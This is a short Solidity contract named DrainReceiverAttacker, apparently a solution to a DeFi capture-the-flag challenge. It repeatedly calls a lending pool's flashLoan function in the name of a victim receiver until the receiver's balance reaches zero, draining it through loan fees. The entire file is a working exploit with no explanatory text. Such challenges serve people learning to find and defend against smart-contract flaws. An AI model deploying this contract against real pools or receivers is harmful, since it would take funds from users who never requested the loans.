pragma solidity ^0.6.0;

contract DrainReceiverAttacker {
    address payable private pool;

    constructor(address payable _pool) public {
        pool = _pool;
    }

    function drainReceiver(address payable _receiver, uint256 _amount) public {
        while (_receiver.balance > 0) {
            (bool success, ) = pool.call(
                abi.encodeWithSignature(
                    "flashLoan(address,uint256)",
                    _receiver,
                    _amount
                )
            );
            require(success, "Extraction failed");
        }
    }
}
